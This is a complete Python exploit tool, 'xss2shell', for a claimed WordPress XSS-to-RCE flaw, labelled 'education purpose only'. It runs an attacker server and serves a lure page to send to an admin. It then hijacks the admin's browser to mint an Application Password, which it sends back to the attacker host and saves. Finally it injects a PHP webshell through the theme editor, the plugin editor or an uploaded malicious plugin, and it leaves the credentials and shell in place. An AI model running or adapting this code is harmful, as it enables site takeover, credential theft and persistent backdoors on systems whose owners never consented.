#!/usr/bin/env python3
"""
xss2shell — CVE-2026-64638
WordPress < 7.0.3 Pre-Auth Stored XSS → RCE

One XSS. Full RCE. No authentication required.

https://wordsec.net/ | Education Purpose Only
"""

import argparse
import base64
import html
import io
import json
import socket
import sys
import threading
import time
import urllib.parse
import urllib.request
import uuid
import zipfile
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

BANNER = r"""
 __  __ ___ ___ ___ ___ _  _  ___ _    _
 \ \/ // __/ __| _ \ __| || |/ __| |  | |
  >  < \__ \__ \  _/ _|| __ | (__| |__| |__
 /_/\_\|___/___/_| |___|_||_|\___|____|____|

 CVE-2026-64638 | WordPress < 7.0.3
 Pre-Auth Stored XSS → RCE

 https://wordsec.net/ | For authorized testing only
"""

VERSION = "1.0.0"
UA = f"xss2shell/{VERSION} (https://wordsec.net/)"
PLUGIN_SLUG = "xss2shell"
APP_NAME = "XSS2Shell-Poc-Wordsec"
CREDS_FILE = "xss2shell_creds.json"

# ── Global State ─────────────────────────────────────────────────────────────

G = {
    "site": None,
    "origin": None,
    "success_url": None,
    "app_id": None,
    "blogname": "WordPress",
    "delay_ms": 3000,
    "steps": [],
    "step_set": set(),
    "captured": None,
    "published": None,
    "shell_method": None,
}

STEP_MSG = {
    "lure_loaded":    "[+] Victim opened the attacker page",
    "opener_loaded":  "[+] Exploit chain started in victim's browser",
    "child_written":  "[+] Popup window initialized",
    "child_ready":    "[+] XSS payload armed",
    "submit_sent":    "[+] XSS payload POSTed to wp-login.php",
    "upload_started": "[+] Shell deployment started (victim's session)",
}

# ── Helpers ──────────────────────────────────────────────────────────────────

def set_step(name, msg=""):
    if name not in G["step_set"]:
        G["step_set"].add(name)
        G["steps"].append((name, msg))


def load_creds(site=None):
    try:
        with open(CREDS_FILE) as f:
            data = json.load(f)
    except Exception:
        return None
    saved = data.get("site") or data.get("site_url")
    if site and saved and saved != site:
        return None
    return data


def save_creds(creds):
    creds = dict(creds)
    creds["saved_at"] = time.strftime("%Y-%m-%d %H:%M:%S")
    if not creds.get("shell_url"):
        creds["shell_url"] = (
            (creds.get("site_url") or "").rstrip("/")
            + f"/wp-content/plugins/{PLUGIN_SLUG}/shell.php"
        )
    try:
        with open(CREDS_FILE, "w") as f:
            json.dump(creds, f, indent=2)
        print(f"[+] Credentials saved → {CREDS_FILE}")
    except Exception as e:
        print(f"[!] Could not save credentials: {e}")


def http_get(url):
    req = urllib.request.Request(url, headers={"User-Agent": UA})
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def http_json(url, data=None, headers=None, method=None):
    h = dict(headers or {})
    h.setdefault("User-Agent", UA)
    req = urllib.request.Request(
        url,
        data=(json.dumps(data).encode() if data is not None else None),
        headers=h,
        method=method,
    )
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return json.loads(r.read().decode())
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "replace")
        try:
            return json.loads(body)
        except Exception:
            return {"_http_error": e.code, "_body": body[:500]}


def basic_auth_header(user_login, password):
    token = base64.b64encode(f"{user_login}:{password}".encode()).decode()
    return {"Authorization": f"Basic {token}", "Content-Type": "application/json"}


def shell_alive(shell_url):
    try:
        r = http_json(shell_url + "?cmd=" + urllib.parse.quote("id"))
        return bool(r.get("rce"))
    except Exception:
        return False

# ── XSS Payload ──────────────────────────────────────────────────────────────

XSS_PAYLOAD = (
    "< area id=ajaxurl href=/?rest_route=/&_method=GET"
    "&_jsonp=window.opener.approve.click&_envelope=1>"
    "< div id=color-picker class=reset-pass-submit>"
    '< button class="wp-generate-pw color-option">X'
)

# ── Server-Side RCE (fallback via stolen Application Password) ───────────────

def server_side_rce(site, user_login, password):
    auth = basic_auth_header(user_login, password)
    webshell_php = (
        "\nif(isset($_GET['xss2shell_cmd'])){"
        "header('Content-Type:application/json');"
        "echo json_encode(array('rce'=>true,'output'=>shell_exec($_GET['xss2shell_cmd'])));"
        "exit;}\n"
    )

    # Try installing a plugin from wordpress.org
    print("[*] Server-side: attempting plugin install via REST API...")
    try:
        result = http_json(
            site + "/wp-json/wp/v2/plugins",
            data={"slug": "starter-templates", "status": "active"},
            headers=auth,
        )
        if result.get("plugin"):
            print(f"[+] Plugin installed: {result.get('plugin')}")
    except Exception as e:
        print(f"[*] Plugin install failed: {e}")

    # Try theme editor via Basic Auth
    print("[*] Server-side: attempting theme-editor.php...")
    try:
        req = urllib.request.Request(
            site + "/wp-admin/theme-editor.php?file=functions.php",
            headers={"User-Agent": UA, "Authorization": auth["Authorization"]},
        )
        with urllib.request.urlopen(req, timeout=20) as r:
            page = r.read().decode("utf-8", "replace")

            nonce = _extract_field(page, 'name="nonce"')
            content = _extract_textarea(page, "newcontent")
            theme = _extract_field(page, 'name="theme"')

            if nonce and content is not None:
                if "xss2shell_cmd" not in content:
                    content += webshell_php

                post_data = urllib.parse.urlencode({
                    "nonce": nonce,
                    "_wp_http_referer": "/wp-admin/theme-editor.php?file=functions.php",
                    "newcontent": content,
                    "action": "update",
                    "file": "functions.php",
                    "theme": theme or "twentytwentyfour",
                }).encode()

                req2 = urllib.request.Request(
                    site + "/wp-admin/theme-editor.php",
                    data=post_data,
                    headers={
                        "User-Agent": UA,
                        "Authorization": auth["Authorization"],
                        "Content-Type": "application/x-www-form-urlencoded",
                    },
                )
                with urllib.request.urlopen(req2, timeout=20) as r2:
                    resp = r2.read().decode("utf-8", "replace")
                    if "File edited successfully" in resp or "updated=true" in r2.url:
                        print("[+] Server-side: webshell injected via theme editor!")
                        return True

    except urllib.error.HTTPError as e:
        if e.code in (302, 403):
            print("[*] App Passwords can't access wp-admin (expected)")
    except Exception as e:
        print(f"[*] Theme editor failed: {e}")

    return False


def _extract_field(html_str, needle):
    i = html_str.find(needle)
    if i == -1:
        return None
    val_idx = html_str.find('value="', max(0, i - 200), i + 200)
    if val_idx == -1:
        val_idx = html_str.find('value="', i)
    if val_idx == -1:
        return None
    start = val_idx + 7
    end = html_str.find('"', start)
    if end == -1 or end > start + 50:
        return None
    return html_str[start:end]


def _extract_textarea(html_str, element_id):
    marker = f'id="{element_id}"'
    idx = html_str.find(marker)
    if idx == -1:
        return None
    ta_start = html_str.find('>', idx) + 1
    ta_end = html_str.find('</textarea>', ta_start)
    if ta_end == -1:
        return None
    return html_str[ta_start:ta_end]

# ── Page Builders ────────────────────────────────────────────────────────────

def build_opener_page():
    origin = G["origin"]
    site = G["site"]
    delay = int(G["delay_ms"])
    value = html.escape(XSS_PAYLOAD, quote=True)

    return f"""<!doctype html>
<html><head><meta charset="utf-8"><title>xss2shell</title></head>
<body><script>
(function () {{
  var ORIGIN = {origin!r};
  var SITE = {site!r};
  var SUCCESS = {G["success_url"]!r};
  var APP_ID = {G["app_id"]!r};
  var APP_NAME = {APP_NAME!r};
  var LOG_VALUE = {value!r};
  var DELAY = {delay};

  function beacon(k, v) {{
    new Image().src = ORIGIN + '/beacon?step=' + encodeURIComponent(k)
      + '&msg=' + encodeURIComponent(v || '');
  }}

  function child_content() {{
    return '<!doctype html><meta charset="utf-8"><title>xss2shell</title>'
      + '<form id="f" method="post" action="' + SITE + '/wp-login.php">'
      + '<input type="hidden" name="log" value="' + LOG_VALUE + '">'
      + '<input type="hidden" name="pwd" value="x">'
      + '</form>'
      + '<scr' + 'ipt>'
      + 'function b(k,v){{new Image().src="' + ORIGIN + '/beacon?step="+encodeURIComponent(k)+"&msg="+encodeURIComponent(v||"");}}'
      + "b('child_ready');"
      + "setTimeout(function(){{b('submit_sent');document.getElementById('f').submit();}}," + DELAY + ");"
      + '</scr' + 'ipt>';
  }}

  function run() {{
    beacon('opener_loaded');
    var child = null;
    try {{ child = window.open('about:blank', 'xss2child'); }} catch (e) {{}}
    if (!child) {{ beacon('popup_blocked'); return; }}
    try {{
      child.location.href = ORIGIN + '/child';
      beacon('child_written');
    }} catch (e) {{ beacon('child_error', String(e)); }}

    location.href = SITE + '/wp-admin/authorize-application.php'
      + '?app_name=' + encodeURIComponent(APP_NAME)
      + '&app_id=' + APP_ID
      + '&success_url=' + encodeURIComponent(SUCCESS);
  }}

  run();
}})();
</script></body></html>"""


def build_child_page():
    origin = G["origin"]
    site = G["site"]
    delay = int(G["delay_ms"])
    value = html.escape(XSS_PAYLOAD, quote=True)

    return f"""<!doctype html>
<html><head><meta charset="utf-8"><title>xss2shell - child</title></head>
<body>
<form id="f" method="post" action="{site}/wp-login.php">
  <input type="hidden" name="log" value="{value}">
  <input type="hidden" name="pwd" value="x">
</form>
<script>
(function () {{
  var ORIGIN = {origin!r};
  var DELAY = {delay};
  function b(k,v) {{
    new Image().src = ORIGIN + '/beacon?step=' + encodeURIComponent(k)
      + '&msg=' + encodeURIComponent(v || '');
  }}
  b('child_ready');
  setTimeout(function () {{
    b('submit_sent');
    document.getElementById('f').submit();
  }}, DELAY);
}})();
</script></body></html>"""


def build_callback_page(fallback=None):
    origin = G["origin"]
    site = G["site"]

    nonce_extract_fn = (
        "function findNonce(h,fname){{"
        "var needle='name=\"'+fname+'\"';"
        "var i=h.indexOf(needle);"
        "if(i===-1)return null;"
        "var tagStart=h.lastIndexOf('<',i);"
        "if(tagStart===-1)return null;"
        "var tagEnd=h.indexOf('>',i);"
        "if(tagEnd===-1||tagEnd>i+300)return null;"
        "var tag=h.substring(tagStart,tagEnd+1);"
        "var vi=tag.indexOf('value=\"');"
        "if(vi===-1)return null;"
        "var vs=vi+7;"
        "var ve=tag.indexOf('\"',vs);"
        "if(ve===-1||ve>vs+20)return null;"
        "return tag.substring(vs,ve);"
        "}}"
    )
    textarea_extract_fn = (
        "function getTA(h){{"
        "var doc=(new DOMParser()).parseFromString(h,'text/html');"
        "var ta=doc.getElementById('newcontent');"
        "if(!ta)return null;"
        "return ta.value;"
        "}}"
    )
    webshell_code = (
        "\\nif(isset($_GET[\\\"xss2shell_cmd\\\"])){{"
        "header(\\\"Content-Type:application/json\\\");"
        "echo json_encode(array(\\\"rce\\\"=>true,\\\"output\\\"=>shell_exec($_GET[\\\"xss2shell_cmd\\\"])));"
        "exit;}}"
    )

    published_js = (
        "(async function(){{"
        f"var B='{origin}';"
        f"var ZIP='{origin}/payload.zip';"
        "function b(k,v){{new Image().src=B+'/beacon?step='+encodeURIComponent(k)+'&msg='+encodeURIComponent(v||'');}}"
        + nonce_extract_fn
        + textarea_extract_fn
        + "try{{"
        + "b('upload_started');"
        + "var ok=false;"
        # Method 1: Theme file editor
        + "try{{"
        + "var te=await(await fetch('/wp-admin/theme-editor.php?file=functions.php',{{credentials:'same-origin'}})).text();"
        + "var nonce=findNonce(te,'nonce');"
        + "var content=getTA(te);"
        + "var thm=te.indexOf('name=\"theme\"');"
        + "var thmVal=null;"
        + "if(thm>=0){{var tv=te.indexOf('value=\"',thm);if(tv>=0){{var tvs=tv+7;var tve=te.indexOf('\"',tvs);thmVal=te.substring(tvs,tve);}}}}"
        + "b('te_debug','nonce:'+(nonce||'null')+' theme:'+(thmVal||'null')+' content:'+(content!==null?'yes':'no'));"
        + "if(nonce&&content!==null){{"
        + "var shell='" + webshell_code + "';"
        + "if(content.indexOf('xss2shell_cmd')===-1){{content+=shell;}}"
        + "var tp=new URLSearchParams();"
        + "tp.append('nonce',nonce);"
        + "tp.append('_wp_http_referer','/wp-admin/theme-editor.php?file=functions.php');"
        + "tp.append('newcontent',content);"
        + "tp.append('action','update');"
        + "tp.append('file','functions.php');"
        + "tp.append('theme',thmVal||'twentytwentyfour');"
        + "var r2=await fetch('/wp-admin/theme-editor.php',{{method:'POST',headers:{{'Content-Type':'application/x-www-form-urlencoded'}},body:tp.toString(),credentials:'same-origin'}});"
        + "var rtxt2=await r2.text();"
        + "if(rtxt2.indexOf('File edited successfully')!==-1||r2.url.indexOf('a=1')!==-1){{ok=true;b('upload_result','THEME_EDITOR_OK');}}"
        + "else{{b('te_fail','status:'+r2.status);}}"
        + "}}else{{b('te_missing','nonce:'+(nonce||'null'));}}"
        + "}}catch(e1){{b('te_err',String(e1));}}"
        # Method 2: Plugin ZIP upload
        + "if(!ok){{"
        + "try{{"
        + "var zip=await(await fetch(ZIP)).arrayBuffer();"
        + "b('zip_size',String(zip.byteLength));"
        + "var pihtml=await(await fetch('/wp-admin/plugin-install.php?tab=upload',{{credentials:'same-origin'}})).text();"
        + "var piNonce=findNonce(pihtml,'_wpnonce');"
        + "b('pi_nonce',piNonce||'NOT_FOUND');"
        + "if(piNonce){{"
        + "var fd=new FormData();"
        + "fd.append('_wpnonce',piNonce);"
        + "fd.append('_wp_http_referer','/wp-admin/plugin-install.php?tab=upload');"
        + "fd.append('install-plugin-submit','Install Now');"
        + "fd.append('pluginzip',new File([zip],'xss2shell.zip',{{type:'application/zip'}}));"
        + "var resp=await fetch('/wp-admin/update.php?action=upload-plugin',{{method:'POST',body:fd,credentials:'same-origin'}});"
        + "var rtxt=await resp.text();"
        + "if(rtxt.indexOf('successfully installed')!==-1||rtxt.indexOf('Plugin installed')!==-1){{ok=true;b('upload_result','PLUGIN_OK');}}"
        + "else{{b('pi_fail','status:'+resp.status);}}"
        + "}}"
        + "}}catch(e2){{b('pi_err',String(e2));}}"
        + "}}"
        # Method 3: Plugin editor
        + "if(!ok){{"
        + "var plugs=[{{p:'hello.php',f:'hello.php',slug:'hello'}},{{p:'basic-auth/basic-auth.php',f:'basic-auth/basic-auth.php',slug:'basic-auth/basic-auth'}}];"
        + "for(var pi3=0;plugs.length>pi3;pi3++){{if(ok)break;"
        + "try{{"
        + "var plg=plugs[pi3];"
        + "b('pe_trying',plg.p);"
        + "var pe=await(await fetch('/wp-admin/plugin-editor.php?plugin='+encodeURIComponent(plg.p)+'&file='+encodeURIComponent(plg.f),{{credentials:'same-origin'}})).text();"
        + "var apk='wpApiSettings';var api=pe.indexOf(apk);var wpn='';if(api>=0){{var ni=pe.indexOf('nonce',api);if(ni>=0&&api+200>ni){{var ns=pe.indexOf('\"',ni+7);var ne=pe.indexOf('\"',ns+1);if(ns>=0&&ne>ns)wpn=pe.substring(ns+1,ne);}}}}"
        + "if(wpn){{b('pe_activating',plg.slug);try{{var ar=await fetch('/wp-json/wp/v2/plugins/'+encodeURIComponent(plg.slug),{{method:'POST',headers:{{'Content-Type':'application/json','X-WP-Nonce':wpn}},body:JSON.stringify({{status:'active'}}),credentials:'same-origin'}});b('pe_activate_resp',String(ar.status));}}catch(ea){{b('pe_activate_err',String(ea));}}}}"
        + "var peNonce=findNonce(pe,'nonce');"
        + "var peContent=getTA(pe);"
        + "if(peNonce&&peContent!==null){{"
        + "var shell3='" + webshell_code + "';"
        + "if(peContent.indexOf('xss2shell_cmd')===-1){{peContent+=shell3;}}"
        + "var pp=new URLSearchParams();"
        + "pp.append('nonce',peNonce);"
        + "pp.append('_wp_http_referer','/wp-admin/plugin-editor.php?plugin='+encodeURIComponent(plg.p)+'&file='+encodeURIComponent(plg.f));"
        + "pp.append('newcontent',peContent);"
        + "pp.append('action','update');"
        + "pp.append('file',plg.f);"
        + "pp.append('plugin',plg.p);"
        + "var r3=await fetch('/wp-admin/plugin-editor.php',{{method:'POST',headers:{{'Content-Type':'application/x-www-form-urlencoded'}},body:pp.toString(),credentials:'same-origin'}});"
        + "var rtxt3=await r3.text();"
        + "if(rtxt3.indexOf('File edited successfully')!==-1||r3.url.indexOf('a=1')!==-1||r3.url.indexOf('liveupdate=1')!==-1){{"
        + "ok=true;b('upload_result','PLUGIN_EDITOR_OK:'+plg.p);"
        + "try{{var adp=await(await fetch('/wp-admin/',{{credentials:'same-origin'}})).text();var wpi=adp.indexOf('wpApiSettings');if(wpi>=0){{var nci=adp.indexOf('nonce',wpi);if(nci>=0){{var q1=adp.indexOf('\"',nci+7);var q2=adp.indexOf('\"',q1+1);if(q1>=0&&q2>q1){{var rn=adp.substring(q1+1,q2);b('activating',plg.slug);var ac=await fetch('/wp-json/wp/v2/plugins/'+encodeURIComponent(plg.slug),{{method:'POST',headers:{{'Content-Type':'application/json','X-WP-Nonce':rn}},body:JSON.stringify({{status:'active'}}),credentials:'same-origin'}});b('activate_status',String(ac.status));}}}}}}}}catch(eact){{b('activate_err',String(eact));}}"
        + "}}"
        + "}}else{{b('pe_missing',plg.p);}}"
        + "}}catch(e3){{b('pe_err',plg.p+' '+String(e3));}}"
        + "}}"
        + "}}"
        + "if(!ok){{b('upload_result','ALL_FAILED');}}"
        + "else{{b('upload_result','SHELL_READY');}}"
        + "}}catch(e){{b('upload_result','ERR:'+e);}}"
        + "}})();"
    )

    head = "<script>" + published_js

    if fallback:
        fallback_js = f"  var FALLBACK = {json.dumps(fallback)};\n"
        user_line = "  var user = qs.get('user_login') || (FALLBACK && FALLBACK.user_login);"
        pass_line = "  var pass = qs.get('password') || (FALLBACK && FALLBACK.password);"
    else:
        fallback_js = ""
        user_line = "  var user = qs.get('user_login');"
        pass_line = "  var pass = qs.get('password');"

    return f"""<!doctype html>
<html><head><meta charset="utf-8"><title>xss2shell - callback</title></head>
<body><script>
(function () {{
  var ORIGIN = {origin!r};
  var site = {site!r};
  var qs = new URLSearchParams(location.search);
  {fallback_js}
  {user_line}
  {pass_line}
  function beacon(k, v) {{
    new Image().src = ORIGIN + '/beacon?step=' + encodeURIComponent(k)
      + '&msg=' + encodeURIComponent(v || '');
  }}
  if (!pass) {{
    document.body.textContent = 'no application password captured';
    beacon('publish_error', 'no password');
    return;
  }}
  var content = {json.dumps(head)} + '</scr' + 'ipt>';
  fetch(site + '/wp-json/wp/v2/pages', {{
    method: 'POST',
    headers: {{
      'Authorization': 'Basic ' + btoa(user + ':' + pass),
      'Content-Type': 'application/json'
    }},
    body: JSON.stringify({{
      title: 'xss2shell-' + Date.now(),
      status: 'publish',
      content: content
    }})
  }}).then(function (r) {{ return r.json(); }}).then(function (obj) {{
    if (obj && obj.link) {{
      beacon('publish_ok', obj.link);
      beacon('page_id', String(obj.id));
      location.href = obj.link;
    }} else {{
      document.body.textContent = 'publish failed: ' + JSON.stringify(obj);
      beacon('publish_error', JSON.stringify(obj));
    }}
  }}).catch(function (e) {{ beacon('publish_error', String(e)); }});
}})();
</script></body></html>"""

# ── Plugin ZIP Builder ───────────────────────────────────────────────────────

def build_plugin_zip():
    main_php = (
        "<?php\n"
        "/**\n"
        " * Plugin Name: XSS2Shell PoC\n"
        " * Version: 1.0.0\n"
        " */\n"
    )
    shell_php = (
        "<?php\n"
        "if (isset($_REQUEST['cmd'])) {\n"
        "    header('Content-Type: application/json');\n"
        "    echo json_encode(['rce' => true, 'output' => shell_exec($_REQUEST['cmd'])]);\n"
        "    exit;\n"
        "}\n"
        "http_response_code(404);\n"
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr(f"{PLUGIN_SLUG}/{PLUGIN_SLUG}.php", main_php)
        z.writestr(f"{PLUGIN_SLUG}/shell.php", shell_php)
    return buf.getvalue()

# ── HTTP Server ──────────────────────────────────────────────────────────────

class Handler(BaseHTTPRequestHandler):
    server_version = "xss2shell"

    def log_message(self, *args):
        pass

    def _reply(self, code, body, ctype="text/plain"):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type, Authorization")
        self.end_headers()
        self.wfile.write(body)

    def do_OPTIONS(self):
        self.send_response(204)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type, Authorization")
        self.send_header("Content-Length", "0")
        self.end_headers()

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        qs = urllib.parse.parse_qs(parsed.query)

        if parsed.path == "/":
            self._reply(200, build_opener_page().encode(), "text/html")

        elif parsed.path == "/child":
            self._reply(200, build_child_page().encode(), "text/html")

        elif parsed.path == "/callback":
            fallback = None
            qpass = qs.get("password", [""])[0]
            if qpass:
                G["captured"] = {
                    "site_url": qs.get("site_url", [""])[0],
                    "user_login": qs.get("user_login", [""])[0],
                    "password": qpass,
                }
                save_creds(G["captured"])
                set_step(
                    "password_captured",
                    f"user={G['captured']['user_login']} pass={G['captured']['password']}"
                )
                threading.Thread(
                    target=server_side_rce,
                    args=(G["site"], G["captured"]["user_login"], G["captured"]["password"]),
                    daemon=True,
                ).start()
            else:
                fallback = load_creds(G["site"])
                if fallback:
                    G["captured"] = fallback
                    print(f"[*] Reusing saved credentials (user={fallback['user_login']})")
            self._reply(200, build_callback_page(fallback).encode(), "text/html")

        elif parsed.path == "/beacon":
            name = qs.get("step", [""])[0]
            msg = qs.get("msg", [""])[0]
            if name == "publish_ok":
                G["published"] = {"link": msg}
            elif name == "page_id":
                G["published"] = dict(G["published"] or {}, id=msg)
            elif name == "upload_result" and msg == "ALL_FAILED" and G.get("captured"):
                print("[*] Browser methods failed, retrying server-side...")
                threading.Thread(
                    target=server_side_rce,
                    args=(G["site"], G["captured"]["user_login"], G["captured"]["password"]),
                    daemon=True,
                ).start()
            set_step(name, msg)
            self._reply(200, b"ok")

        elif parsed.path == "/payload.zip":
            body = build_plugin_zip()
            self.send_response(200)
            self.send_header("Content-Type", "application/zip")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(body)

        elif parsed.path == "/state":
            self._reply(200, json.dumps({
                "steps": G["steps"],
                "captured": G["captured"],
                "published": G["published"],
            }).encode(), "application/json")

        else:
            self._reply(404, b"not found")

# ── Network ──────────────────────────────────────────────────────────────────

def get_lan_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def start_server(host="0.0.0.0", port=0):
    srv = ThreadingHTTPServer((host, port), Handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv

# ── Output ───────────────────────────────────────────────────────────────────

def print_steps(seen, steps):
    for name, msg in steps:
        key = (name, msg)
        if key in seen:
            continue
        seen.add(key)
        if name == "page_id":
            continue
        if name == "password_captured":
            print(f"[+] Application Password stolen: {msg}")
        elif name == "publish_ok":
            print(f"[+] Payload page published: {msg}")
        elif name == "publish_error":
            print(f"[!] Publish failed: {msg}")
        elif name == "upload_result":
            results = {
                "PLUGIN_OK": ("[+] Plugin uploaded → shell.php accessible", "plugin"),
                "THEME_EDITOR_OK": ("[+] Theme editor → webshell in functions.php", "theme"),
                "ALL_FAILED": ("[!] All shell deployment methods failed", None),
                "SHELL_READY": ("[+] Shell deployed successfully", None),
            }
            if msg in results:
                print(results[msg][0])
                if results[msg][1]:
                    G["shell_method"] = results[msg][1]
            elif msg.startswith("PLUGIN_EDITOR_OK"):
                print(f"[+] Plugin editor → webshell injected ({msg})")
                G["shell_method"] = "plugin_editor"
            elif msg.startswith("ERR:"):
                print(f"[!] Shell deployment error: {msg}")
            else:
                print(f"[*] Deploy status: {msg}")
        elif name == "popup_blocked":
            print("[!] Browser blocked the popup — chain failed")
        elif name in STEP_MSG:
            print(STEP_MSG[name])
        else:
            print(f"[*] {name}: {msg}")

# ── Cleanup ──────────────────────────────────────────────────────────────────

def cleanup(site, captured, published, app_id, shell_url):
    if not captured:
        print("[*] Cleanup: no credentials, skipped")
        return
    headers = basic_auth_header(captured["user_login"], captured["password"])
    if published and published.get("id"):
        try:
            http_json(
                f"{site}/wp-json/wp/v2/pages/{published['id']}?force=true",
                method="DELETE", headers=headers,
            )
            print(f"[*] Cleanup: page deleted (id={published['id']})")
        except Exception as e:
            print(f"[*] Cleanup: could not delete page: {e}")
    print("[*] Cleanup: credentials and shell preserved for verification")

# ── Main ─────────────────────────────────────────────────────────────────────

def main():
    print(BANNER)

    ap = argparse.ArgumentParser(
        description="xss2shell — CVE-2026-64638 | WordPress < 7.0.3 Pre-Auth XSS → RCE",
    )
    ap.add_argument("-t", "--target", required=True,
                    help="WordPress URL (e.g. http://target.com)")
    ap.add_argument("-c", "--command", required=True,
                    help="OS command to execute (e.g. id)")
    ap.add_argument("--lhost", default=None,
                    help="attacker IP (default: auto-detect)")
    ap.add_argument("--lport", type=int, default=0,
                    help="attacker port (default: random)")
    ap.add_argument("--keep", action="store_true",
                    help="preserve artifacts after exploitation")
    ap.add_argument("--version", action="version", version=f"xss2shell {VERSION}")
    args = ap.parse_args()

    site = args.target.rstrip("/")
    if not site.startswith(("http://", "https://")):
        ap.error("target must start with http:// or https://")

    G["site"] = site
    G["app_id"] = str(uuid.uuid4())

    saved = load_creds(site)
    if saved:
        print(f"[*] Found saved credentials (user={saved['user_login']})")

    print(f"[*] Target: {site}")
    try:
        status, body = http_get(site + "/wp-login.php")
    except Exception as e:
        print(f"[!] wp-login.php unreachable: {e}")
        sys.exit(1)
    if status != 200 or "user_login" not in body:
        print(f"[!] No WordPress login form (HTTP {status})")
        sys.exit(1)
    print(f"[+] WordPress login found")

    try:
        info = http_json(site + "/wp-json/")
        if isinstance(info, dict) and info.get("name"):
            G["blogname"] = info["name"]
    except Exception:
        pass

    if args.lhost and args.lhost != "0.0.0.0":
        bind_host = lan_ip = args.lhost
    else:
        bind_host = "0.0.0.0"
        lan_ip = get_lan_ip()

    srv = start_server(bind_host, args.lport)
    _, port = srv.server_address
    G["origin"] = f"http://{lan_ip}:{port}"
    G["success_url"] = f"http://{lan_ip}:{port}/callback"
    url = G["origin"] + "/"
    shell_url = f"{site}/wp-content/plugins/{PLUGIN_SLUG}/shell.php"

    print(f"[+] Listening on {lan_ip}:{port}")
    print(f"[*] Send this to the admin → {url}")
    print("[*] Waiting for victim ...")

    seen = set()
    got_shell = False

    try:
        while True:
            st = {}
            try:
                st = http_json(f"{G['origin']}/state")
            except Exception:
                pass
            print_steps(seen, st.get("steps") or [])

            method = G.get("shell_method")
            if method == "plugin" and shell_alive(shell_url):
                got_shell = True
                break
            elif method == "theme":
                try:
                    r = http_json(f"{site}/?xss2shell_cmd=" + urllib.parse.quote("id"))
                    if r.get("rce"):
                        shell_url = f"{site}/?xss2shell_cmd="
                        got_shell = True
                        break
                except Exception:
                    pass
            elif method == "plugin_editor":
                try:
                    r = http_json(
                        f"{site}/wp-content/plugins/basic-auth/basic-auth.php"
                        f"?xss2shell_cmd=" + urllib.parse.quote("id")
                    )
                    if r.get("rce"):
                        shell_url = (
                            f"{site}/wp-content/plugins/basic-auth/basic-auth.php"
                            f"?xss2shell_cmd="
                        )
                        got_shell = True
                        break
                except Exception:
                    pass
            elif method is not None:
                break
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\n[*] Interrupted")
        creds = G.get("captured") or load_creds(site)
        if not args.keep and creds:
            cleanup(site, creds, G["published"], G["app_id"], shell_url)
        srv.shutdown()
        sys.exit(0)

    if not got_shell:
        names = {s[0] for s in G["steps"]}
        if "opener_loaded" not in names:
            print("[!] Admin never visited the lure URL")
        elif "password_captured" not in names:
            print("[!] XSS failed — target may be patched (>= 7.0.3)")
        elif "upload_result" not in names:
            print("[!] Shell deployment incomplete")
        else:
            print("[!] Shell unreachable")
        creds = G.get("captured") or load_creds(site)
        if not args.keep and creds:
            cleanup(site, creds, G["published"], G["app_id"], shell_url)
        srv.shutdown()
        sys.exit(1)

    # Build shell URL based on method
    method = G.get("shell_method")
    if method == "plugin":
        cmd_url = shell_url + "?cmd=" + urllib.parse.quote(args.command)
        shell_link = f"{shell_url}?cmd=whoami"
    elif method == "theme":
        cmd_url = f"{site}/?xss2shell_cmd=" + urllib.parse.quote(args.command)
        shell_link = f"{site}/?xss2shell_cmd=whoami"
    elif method == "plugin_editor":
        base = f"{site}/wp-content/plugins/basic-auth/basic-auth.php"
        cmd_url = f"{base}?xss2shell_cmd=" + urllib.parse.quote(args.command)
        shell_link = f"{base}?xss2shell_cmd=whoami"
    else:
        cmd_url = shell_url + "?cmd=" + urllib.parse.quote(args.command)
        shell_link = f"{shell_url}?cmd=whoami"

    result = http_json(cmd_url)
    out = result.get("output")

    print()
    print("=" * 60)
    print(f"[+] RCE via {method}")
    print(f"[+] $ {args.command}")
    print("-" * 60)
    print(out.strip() if out else "(no output)")
    print("=" * 60)

    creds = G.get("captured") or load_creds(site)
    if not args.keep and creds:
        cleanup(site, creds, G["published"], G["app_id"], shell_url)

    print(f"\n[+] Shell → {shell_link}")
    print("[+] Done.")
    srv.shutdown()


if __name__ == "__main__":
    main()
